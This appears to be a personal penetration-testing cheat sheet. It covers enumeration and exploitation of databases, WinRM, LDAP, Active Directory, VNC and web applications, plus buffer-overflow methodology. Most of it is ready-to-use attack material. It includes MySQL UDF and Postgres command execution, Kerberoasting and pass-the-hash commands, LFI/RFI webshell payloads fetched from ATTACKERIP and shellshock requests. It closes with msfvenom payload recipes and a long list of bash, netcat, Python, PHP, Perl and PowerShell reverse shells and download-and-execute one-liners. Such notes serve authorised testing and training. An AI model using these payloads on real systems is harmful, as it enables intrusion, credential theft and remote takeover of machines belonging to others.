
**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.
> If `root` access is available to DB, enumerate for `UDF` exploit possibility.


**References**
> Check Version Compatibility - https://mariadb.com/kb/en/mariadb-vs-mysql-compatibility/
> https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html
> http://www.mysqludf.org/
> https://www.exploit-db.com/exploits/1518
> https://github.com/mysqludf


**General Information**
> `MySQL` Hash File - `/var/lib/mysql/mysql/user.MYD`


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:3306 --script "mysql-empty-password,mysql-enum,mysql-info" -sV -oA recon/nmap-${IP}-tcp-mysql ${IP}
```

```text

```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Hydra`


**UDF**

If having `root` access on `mysql`, check for possibility of `UDF`.

```sql
SHOW VARIABLES LIKE "secure_file_priv";

@@plugin_dir;
SHOW VARIABLES LIKE 'plugin_dir';

SHOW Grants;
```


```bash
mysql -h 127.0.0.1 -P 13306 -uroot -p
mysql -u root -p
```

```sql
SHOW VARIABLES LIKE 'plugin_dir';
set @shell = 0x
select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';
create function sys_exec returns int soname 'udf_sys_exec.so';
select * from mysql.func where name='sys_exec';
select sys_exec('wget http://<ip>/shell.elf');
select sys_exec('chmod +x ./shell.elf');
select sys_exec('./shell.elf');
```

```sql
use mysql;
create table foo(line blob);
SHOW VARIABLES LIKE 'plugin_dir';
insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');

\! sh
cat /tmp/out
```


#### DB (Oracle)

**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:1521-1529,2030,49703 --script "oracle-enum-users,oracle-tns-version" -sV -oA recon/nmap-${IP}-tcp-mysql ${IP}
```

```text

```


#### DB (Postgres)

**General Information**

Default credentials.
- `postgres` - `postgres`

Interesting paths.
- `/etc/postgresql/data/postgresql.conf`


**Access**

```bash
psql -p 5432 -U postgres
```

Commands to enumerate FTP server.

```text
\s    # Get history

\list    # List databases
select datname from pg_database;

\c <database>    # Use the database

\d    # List tables
select schemaname,tablename,tableowner from pg_tables;

select user;
select usename, passwd from pg_shadow;

\du+    # List user roles

\dn+    # List schemas

\df    # List functions
```

Read files and directories.

```text
create table demo(t text);
copy demo from '/etc/passwd';
select * from demo;

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');
```

```text

```


**RCE**

```text
drop table if exists cmd_exec;
create table cmd_exec(cmd_output text);
copy cmd_exec from program 'id';
select * from cmd_exec;
```


#### DB (MongoDB)

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check possibilities for unauthenticated access.
> If any valid creds are found previously, check if they can be reused.


**References**
> https://github.com/andresriancho/mongo-objectid-predict


**Config Files**
- `/opt/mongodb/mongodb.conf`
- `/opt/mongo/mongodb.conf`
- `/etc/mongod.conf`


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:27017,27018 --script "mongodb-databases, mongodb-info" -sV -oA recon/nmap-${IP}-tcp-mongo ${IP}
```

```text

```


**Access**

If credentials are available,

```python
from pymongo import MongoClient
client = MongoClient(host, port, username=username, password=password)
client.server_info() #Basic info
#If you have admin access you can obtain more info
admin = client.admin
admin_info = admin.command("serverStatus")
cursor = client.list_databases()
for db in cursor:
    print(db)
    print(client[db["name"]].list_collection_names())
#If admin access, you could dump the database also
```

```text

```


```bash
PORT="" ; mongo ${IP}:${PORT}
USER="" PASS="" DB="" ; monto ${DB} -u ${USER} -p ${PASS}
```

Commands to enumerate `MongoDB` server.

```text
show dbs

use <db>

show collections

db.<collection>.find()
db.<collection>.count()

db.current.find({"username":"admin"})
```

```text

```


#### WinRM

**General Methodology**
> Enumerate for service and OS information.
> If password or hash is known, enumerate with `evil-winrm`.
> Check possibilities for generating custom wordlist for brute-forcing.


**Enumeration**

```bash
crackmapexec winrm ${IP}
```

```text

```


**Access**

If credentials are known,

```bash
DOMAIN="" USER="" PASS="" HASH="" ; impacket-wmiexec ${USER}:${PASS}@${IP} -com-version 5.6
```

```text

```


```bash
DOMAIN="" USER="" PASS="" ; ruby ${TOOLS_DIR}/windows/evil-winrm/evil-winrm.rb -i ${IP} -u ${USER} -p ${PASS}
```

```bash
DOMAIN="" USER="" HASH="" ; ruby ${TOOLS_DIR}/windows/evil-winrm/evil-winrm.rb -i ${IP} -u ${USER} -H ${HASH}
```

```text

```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Crackmapexec`


#### VNC

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check for well-known exploit POCs.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:5400,5800,5900 --script "vnc-info,vnc-title,realvnc-auth-bypass" -sV -oA recon/nmap-${IP}-tcp-vnc ${IP}
```

```text

```


**Access**

```bash
vncviewer ${IP}:5901
```


**Exploits**
> https://www.exploit-db.com/exploits/36932


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Hydra`


#### Printer

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:631 --script "cups-info,cups-queue-info" -sV -oA recon/nmap-${IP}-tcp-cups ${IP}
```

```text

```


#### Apache James

**General Methodology**
> Check if version or banner can be grabbed using `telnet` or `netcat`.
> Check for default credentials for james admin from `https://james.apache.org/server/archive/configuration_v2_0.html`.
> If any valid creds are found previously, check if they can be reused.


**Enumeration**

```bash
nc -nv ${IP} 4555
```

Commands to enumerate `Apache James` server.

```text
HELP

listusers

verify <user>

setpassword <user> <password>

QUIT
```

```text

```


#### Hylafax

**General Methodology**
> Check if version or banner can be grabbed using `telnet` or `netcat`.


**Enumeration**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 4559
```

Commands to enumerate `Hylafax` server.

```text
HELP

LIST

USER root
PASS root

QUIT
```

```text

```


#### Asterisk

**General Methodology**
> Check if version or banner can be grabbed using `telnet` or `netcat`.


**Enumeration**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 5038
```

```text

```


#### Java RMI


**References**
> https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi
> https://www.youtube.com/watch?v=t_aw1mDNhzI
> https://itnext.io/java-rmi-for-pentesters-part-two-reconnaissance-attack-against-non-jmx-registries-187a6561314d
> https://github.com/frohoff/ysoserial
> https://github.com/qtc-de/remote-method-guesser


**Enumeration**

Download `BaRMIe_v1.01.jar` from https://github.com/NickstaDB/BaRMIe and modify the path, if not available already. Download `rmg-4.3.1-jar-with-dependencies.jar` from https://github.com/qtc-de/remote-method-guesser/releases and modify the path, if not available already.


```bash
PORT="" ; java -jar ${TOOLS_DIR}/web/BaRMIe_v1.01.jar -enum ${IP} ${PORT}
```

```text

```


```bash
java -jar ${TOOLS_DIR}/web/rmg-4.3.1-jar-with-dependencies.jar scan ${IP}
```

```text

```

```bash
PORT="" ; java -jar ${TOOLS_DIR}/web/rmg-4.3.1-jar-with-dependencies.jar enum ${IP} ${PORT}
```

```text

```

```bash
PORT="" ; java -jar ${TOOLS_DIR}/web/rmg-4.3.1-jar-with-dependencies.jar guess ${IP} ${PORT}
```

```text

```


#### LDAP

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> If any valid creds are found previously, check if they can be reused.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:389,636,3268,3269 --script "ldap-rootdse" -sV -oA recon/nmap-${IP}-tcp-ldap ${IP}
```

```text

```


**Access**

Get domain information.

*Simple Auth*

```bash
ldapsearch -h ${IP} -x -s base namingcontexts
```

```text

```

*SASL mechanism*

```bash
ldapsearch -h ${IP} -X -s base namingcontexts
```

```text

```


Check if null login is permitted.

```bash
ldapsearch -x -h ${IP} -D '' -w '' -b "DC=,DC="
```

```text

```


User enumeration.

```bash
ldapsearch -H ldap://${IP} -x -b "DC=,DC=" "(objectClass=person)" | grep "sAMAccountName:"
```

```text

```


If credentials are known,

```bash
DOMAIN="" USER="" PASS="" ; ldapdomaindump -u ${DOMAIN}\${USER} -p ${PASS} ${IP}
```

```text

```


#### Active Directory

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> If valid password or hash is known, check for `AS-REP` possibility.
> Check if possible to request `TGT` for service accounts to decode hashes.
> If any valid creds are found previously, check if they can be reused.


**References**
> https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds
> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:88,389,464,636,3268,3269,9389 -sC -sV -oA recon/nmap-${IP}-tcp-domain ${IP}
```

```text

```


**Access**

If credentials are known,

```bash
DOMAIN="" USER="" PASS="" HASH="" ; winexe -U ${DOMAIN}/${USER}%${PASS} //${IP} cmd.exe
```

```bash
DOMAIN="" USER="" PASS="" HASH="" ; pth-winexe -U ${DOMAIN}/${USER}%${HASH} //${IP} cmd.exe
DOMAIN="" USER="" PASS="" HASH="" ; pth-winexe -U ${USER}%${HASH} //${IP} cmd.exe
DOMAIN="" USER="" PASS="" HASH="" ; pth-winexe --system -U "administrator%${HASH}" //${IP} cmd.exe
```

```text

```


**AS-REP Roasting** (users with kerberos pre-authentication disabled)

```bash
DOMAIN="" ; impacket-GetNPUsers ${DOMAIN}/ -usersfile users -outputfile hash -format hashcat
DOMAIN="" ; impacket-GetNPUsers ${DOMAIN}/ -usersfile users -no-pass -dc-ip ${IP} -format hashcat
DOMAIN="" USER="" ; impacket-GetNPUsers ${DOMAIN}/${USER} -no-pass -dc-ip ${IP} -format hashcat
DOMAIN="" ; impacket-GetNPUsers -dc-ip ${IP} -request ${DOMAIN}/
```

```text

```


Request `TGT` for service accounts to get all hashes.

```bash
DOMAIN="" USER="" HASH="" ; impacket-GetUserSPNs ${DOMAIN}/${USER} -hashes ${HASH} -dc-ip ${IP} -request -outputfile hashes.kerberoast
DOMAIN="" USER="" PASS="" ; impacket-GetUserSPNs ${DOMAIN}/${USER}:${PASS} -dc-ip ${IP} -request
```

```text

```


#### Buffer Overflow

**General Methodology**
> Fuzzing - Force buffer overflow.
> Find Offset - Position of overflow.
> Validate control of EIP.
> Find available offset for payload.
> Find Bad characters.
> Find Return address.


**References**
> https://kashz.gitbook.io/kashz-jewels/buffer-overflow-guide/methodology


**Manual Testing**

*Fuzzing*

Start and run the application. Either `attach` a running process or `open` a process and `run` the execution.

Send the payload manually.

```bash
printf -- 'A%.0s' {1..2000} > payload ; nc -nvC  < payload
```

Check if `Access Violation when executing [41414141]`  message appears and the execution pauses.

> The violation happens when sending `` characters of data.


*Finding the Offset*

> Restart and run the application.

```bash
msf-pattern_create -l  > payload ; nc -nvC  < payload
```


```bash
msf-pattern_offset -l  -q 
```

```text

```


*Controlling EIP and finding available shellcode space*

> Restart and run the application.

```bash
printf -- 'A%.0s' {1..} > payload ; printf -- 'B%.0s' {1..4} >> payload ; printf -- '\x90%.0s' {1..16} >> payload ; printf -- 'C%.0s' {1..5000} >> payload ; nc -nvC  < payload
```


Check in `stack dump` on where the character `C` ends. The difference between that address and `ESP` address is the total available shellcode space.


```bash
printf "%d\n" $(( `printf "0x%X\n" $(( 0x - 0x ))` ))
```

```text

```

If there is not enough space, check for other registers which contain the buffer value. Find the `jump op code` for that address. Use the address in shellcode to point to payload.

```bash
msf-nasm_shell
jmp 
```


*Checking for Bad Chars*

> Restart and run the application.

```python
#!/usr/bin/python2

shellcode = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
shellcode += "C" * 2000

with open('payload','a') as f:
  f.write(shellcode)
  f.close()
```

```bash
printf -- 'A%.0s' {1..} > payload ; printf -- 'B%.0s' {1..4} >> payload ; printf -- "\x90%.0s" {1..16} >> payload ; python2 bad-chars.py ; nc -nvC  < payload
```


Modify the `bad-chars.py` file and remove the bad char `` and iterate till all the bad-chars are removed.

Confirm the removal of `bad characters` using `mona`.

```text
!mona config -set workingfolder C:\mona\%p
!mona bytearray -cpb "\x00"
!mona compare -f C:\mona\\bytearray.bin -a <ESP>
```

```text

```


*Finding Return Address*

> Restart and run the application.

Find if `ESP` or any other register points to the buffer. Find the `jump op code` for that address. Use the address in `EIP` to point the payload.

```bash
msf-nasm_shell
```

```text
nasm > jmp esp
00000000  FFE4              jmp esp
```

Find the module to be used for replacing `EIP` with return address. The module should not contain `ASLR` protection nor should contain address with `00` or other bad chars.

```text
!mona modules
```

```text

```


Find the address of the `op code`.

```text
!mona find -s "\xff\xe4" -m ""
```

```text

```


**Scripts**

*fuzzer.py*

```python
#!/usr/bin/env python3

import socket, time, sys

IP = "MACHINE_IP"

PORT = PORT
TIMEOUT = 5
PREFIX = "OVERFLOW1 "

PAYLOAD_STRING = PREFIX + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            s.connect((IP, PORT))

            # if there is banner being received;
            # check with nc to confirm;
            # remove if not needed
            s.recv(1024)

            # sending payload here.
            print("Fuzzing with {} bytes".format(len(PAYLOAD_STRING) - len(PREFIX)))
            s.send(bytes(PAYLOAD_STRING, "latin-1"))
            # s.send((PAYLOAD_STRING.encode()))

            # if there is reply after sending payload;
            # check with nc to confirm;
            # remove if not needed
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(PAYLOAD_STRING) - len(PREFIX)))
        sys.exit(0)

    PAYLOAD_STRING += 100 * "A"
    time.sleep(1)
```


*exploit.py*

```python
import socket

ip = "IP"
port = PORT

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```


#### VOIP (SIP) (UDP)


**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.


**References**
> https://www.voip-info.org/sipp/
> https://securityonline.info/sippts/
> https://github.com/Pepelux/sippts


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -sU -T4 -p T:8000,U:5060 --script "sip-methods,sip-enum-users,sip-call-spoof" -sV -oA recon/nmap-${IP}-voip ${IP}
```

```text

```


**Access**

Check for `SIP` digest leak.

```bash
python3 ${TOOLS_DIR}/voip/sippts/sipdigestleak.py -i ${IP}
```

```text

```


### Exploitation


#### Web Exploitation

**Insecure Credentials**

Search default credentials for the tool.

> https://github.com/noraj/DefaultCreds-cheat-sheet

```bash
SEARCH="" ; grep -irn ${SEARCH} /usr/share/wordlists/SecLists/Passwords/Default-Credentials
```

```text

```


Test for credentials which can be guessed.

If any release notes or readme document found, build a wordlist using `cewl` or `wordhound`.


**File Uploads**

Identify file upload page and use Burp to modify request parameters.


Use `weevely` to generate payload and upload it. Use the resulting page to start a session.

```bash
weevely generate test123 weevely.php
SITE="" ; weevely ${SITE}/uploads/weevely.php test123
```

```text

```


**LFI**

- `C:\boot.ini`
- `C:\Windows\System32\license.rtf`
- `C:\Winnt\win.ini`
- `C:\Winnt\System32\registry.inf`


```bash
SITE="" ; curl -s "${SITE}/section.php?page=../../../../proc/version"
```

```text

```


**LFI php-wrappers**

```bash
SITE="" ; curl -s "${SITE}/section.php?page=data://text/plain,%3C?php%20phpinfo();%20?%3E"
```

```text

```


```bash
curl -s --data "<?system('bash -i >& /dev/tcp// 0>&1');?>" "http://ATTACKERIP/admin.php?path=php://input%00"
```

```text

```


**LFI log poisoning**

Check if logs for web (`httpd.log` or `apache.log`) or system (`secure` or `auth.log`) is accessible vie `LFI`.

If `secure` or `auth.log` is accessible, try the payload with `ssh`.

```bash
IP="" ; ssh "<?php phpinfo(); ?>"@${IP}
```

```bash
SITE="" ; curl -s "${SITE}/section.php?page=../../../../var/log/auth.log"
```


**RFI**

Serve a simple `php webshell` via python webserver.

```php
<?php echo shell_exec($_GET["cmd"]); ?>
```

```bash
SITE="" ; curl -s "${SITE}/section.php?page=http://ATTACKERIP/php-simple-webshell.php&cmd=whoami"
```

```text

```


Use `weevely` to generate payload and upload it. Use the resulting page to start a session.

```bash
weevely generate test123 weevely.php
SITE="" ; weevely ${SITE}/menu.php?file=http://ATTACKERIP/weevely.php test123
```

```text

```


**Command Injection**

```bash
commix --url="https://${IP}?parameter=" --level=3 --force-ssl --skip-waf --random-agent
```


**CGI**

Check for `shellshock` vulnerability.

```bash
curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://ATTACKERIP/cgi-bin/admin.cgi

curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i >& /dev/tcp// 0>&1; echo zzzz;'" http://ATTACKERIP/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
```

```text

```


**SQL Injection**

> https://pentestwiki.org/sql-injection/
> https://portswigger.net/web-security/sql-injection/cheat-sheet



#### Searching for Exploit


> https://www.exploit-db.com/searchsploit


Search exploits based on nmap xml output.

```bash
searchsploit --nmap recon/*tcp-initial.xml
```

```text

```


Search exploits manually.

```bash
searchsploit "" | grep -ivE 'dos'
```

```text

```


Search using CVE.

```bash
searchsploit --cve ""
```


Search using `pyxploitdb`. Install `pyxploitdb` using https://github.com/nicolasmf/pyxploit-db/wiki#installation if not present already.

```bash
python3 -c 'import pyxploitdb ; pyxploitdb.searchEDB(title="", _print=True, nomsf=True)'
python3 -c 'import pyxploitdb ; pyxploitdb.searchEDB(content="", _print=True, nomsf=True)'
```

```text

```

`_type` - dos, local, remote, shellcode, papers, webapps
`platform` - windows, linux
`verified`
`hasapp`
`nomsf`

```bash
python3 -c 'import pyxploitdb ; pyxploitdb.searchCVE("")'
```

```text

```

CVE-1234-1234 or 1234-1234


Detailed search exploits manually.

```bash
grep -irn "" /usr/share/exploitdb/exploits/
```

Alternatively, search in the url https://www.exploit-db.com/search?text=.


To find link for papers,

```bash
searchsploit -w ""
```

```text

```


Search in [EDB](https://www.exploit-db.com/search).

Platform - `Windows`/`Linux`
Type - `Remote`/`Local`
Title - `windows rpc`/`linux kernel`/`shellshock`

Filter from relevant results and analyze the code and comments. If the exploit does not match OS version, do another search with (CVE - `CVE-ID`)

If there is a metasploit module available, it is assuring that the exploit is well tested and ported.


> https://github.com/mikaelkall/HackingAllTheThings


#### Payloads / Shells / TTY


##### Meterpreter

> https://pentestwiki.org/msfvenom-payloads-cheat-sheet/
> https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

**C**
```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/shell_reverse_tcp LHOST=${LH} LPORT=${LP} EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -o payload.c

msfvenom -p windows/exec CMD=cmd.exe EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -o payload.c
```

**Bin**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/shell_reverse_tcp LHOST=${LH} LPORT=${LP} --platform windows -a x86 -f raw -o payload.bin
```

**Exe**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -p windows -a x64 -f exe -o payload.exe
```

**HTA**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f hta-psh -o payload.hta
```

**VBA-PSH**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f vba-psh -o payload.vba
```

**Powershell**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LH} LPORT=${LP} -f powershell -o payload.ps1
```

**PSH-CMD**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f psh-cmd -o payload.bat
```

**ASP**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p windows/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f asp -e x86/shikata_ga_nai -i 5 -o payload.asp
```

**JSP**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f raw -e x86/shikata_ga_nai -i 5 -o payload.jsp
```

**JS**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p linux/x86/shell_reverse_tcp LHOST=${LH} LPORT=${LP} CMD=/bin/bash -f js_le -e generic/none -o payload.js
```

**WAR**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f war -o payload.war
```

**Python**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p linux/x86/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -e x86/shikata_ga_nai -f py -v shellcode -b "\x00\x20" -o payload.py
```

**ELF**

```bash
LH=ATTACKERIP LP="" ; msfvenom -p linux/x86/shell_reverse_tcp LHOST=${LH} LPORT=${LP} -f elf -o payload.elf
```

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o payload.elf
```


##### Shells

> https://www.revshells.com/
> https://github.com/antonioCoco/ConPtyShell - Fully Interactive Windows Shell - Win 10 / 2019 1809
> https://github.com/mthbernardes/rsg

```bash
python3 rsg ${IP} ${PORT} socat
python3 rsg ${IP} ${PORT} python
```

`RSG` shell types - `bash`, `perl`, `ruby`, `netcat`, `ncat`, `python`, `php`, `telnet`, `powershell`, `awk`, `java`, `node.js`, `tclsh`, `socat`, `jenkins`

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKERIP/443 0>&1'
%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKERIP%2F443%200%3E%261%27
```

```bash
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | sh -i 2>&1 | nc ATTACKERIP 443 >/tmp/f
```

```python
python -c 'import socket,subprocess,os ; s = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) ; s.connect( ( "ATTACKERIP", 443 ) ) ; os.dup2( s.fileno(), 0 ) ; os.dup2( s.fileno(), 1 ) ; os.dup2( s.fileno(), 2 ) ; import pty ; pty.spawn( "sh" ) ;'
```

```python
python -c 'import socket,subprocess,os ; s = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) ; s.connect( ( "ATTACKERIP", 443 ) ) ; os.dup2( s.fileno(), 0 ) ; os.dup2( s.fileno(), 1 ) ; os.dup2( s.fileno(), 2 ) ; p = subprocess.call( [ "/bin/sh", "-i" ] ) ;'
```

```python
python3 -c 'import os,pty,socket ; s = socket.socket() ; s.connect( ( "ATTACKERIP", 443) ) ; [ os.dup2( s.fileno(), f ) for f in (0,1,2) ] ; pty.spawn("sh")'
```

```php
php -r '$sock = fsockopen("ATTACKERIP", 443) ; exec("/bin/sh <&3 >&3 2>&3") ;'
# Try with "shell_exec" or "system" or "passthru" php modules
```

```perl
perl -e 'use Socket ; $i = "ATTACKERIP" ; $p = 443 ; socket( S, PF_INET, SOCK_STREAM, getprotobyname("tcp") ) ; if( connect( S,sockaddr_in( $p, inet_aton($i) ) ) ) { open(STDIN, ">&S") ; open(STDOUT, ">&S") ; open(STDERR, ">&S") ; exec("sh -i") ; } ;'
```

```perl
perl -MIO -e '$p = fork ; exit, if($p) ; $c = new IO::Socket::INET(PeerAddr, "ATTACKERIP:443") ; STDIN -> fdopen($c, r) ; $~ -> fdopen($c, w) ; system$_ while<> ;'
```

```powershell
powershell -nop -ep bypass -c "iex ( (New-Object Net.WebClient).DownloadString('http://ATTACKERIP/tools/powercat.ps1') ) ; powercat -c ATTACKERIP -p 443 -e cmd.exe"
```

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('ATTACKERIP',443) ; $stream = $client.GetStream() ; [byte[]]$bytes = 0..65535 | %{0} ; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { ; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i) ; $sendback = (iex $data 2>&1 | Out-String ) ; $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ' ; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2) ; $stream.Write($sendbyte, 0, $sendbyte.Length) ; $stream.Flush()} ; $client.Close()"
```

```powershell
powershell -nop -noni -W hidden -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('ATTACKERIP', 443) ; $NetworkStream = $TCPClient.GetStream() ; $StreamWriter = New-Object IO.StreamWriter($NetworkStream) ; function WriteToStream ($String) { [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0} ; $StreamWriter.Write($String + 'SHELL> ') ; $StreamWriter.Flush() } WriteToStream '' ; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1) ; $Output = try {Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String}WriteToStream ($Output)} $StreamWriter.Close()"
```

```text
To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with Xnest:
    Xnest :1

Authorise on your system the target IP to connect to you:
    xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
    xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server

On the target, connect back to the open X Server on your system:
    xterm -display attackerip:1
Or:
    $ DISPLAY=attackerip:0 xterm

On Solaris xterm path is usually not within the PATH environment variable, specify its filepath:
    /usr/openwin/bin/xterm -display attackerip:1
```


##### TTY

```python
python -c 'import pty ; pty.spawn("/bin/bash")'
```

```perl
perl -e "exec '/bin/bash -i';"
```

```ruby
ruby -e "exec '/bin/bash -i'"
```


#### Network Hacks

**Port Knocking**

https://github.com/pha5matis/Pentesting-Guide/blob/master/port_knocking.md

`Port Knocking` is a method of externally opening ports on a firewall by generating a connection attempt on a set of pre-specified closed ports. Once a correct sequence of connection attempts is received, the firewall rules are dynamically modified to allow the host which sent the connection attempts to connect over specific port(s). A variant called single packet authorization (`SPA`) exists, where only a single `knock` is needed, consisting of an encrypted packet.

```bash
for x in 4000 5000 6000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x $IP; done
ssh User@$IP -p <port>
```

```bash
nc 192.168.1.102 4000  
nc 192.168.1.102 5000  
nc 192.168.1.102 6000  
nc 192.168.1.102 8888  
ssh User@$IP -p <port>
```


#### Web Hacks

**Interesting Files**

Apache
*Config*
- `/etc/apache2/httpd.conf`
- `/etc/apache2/apache2.conf`
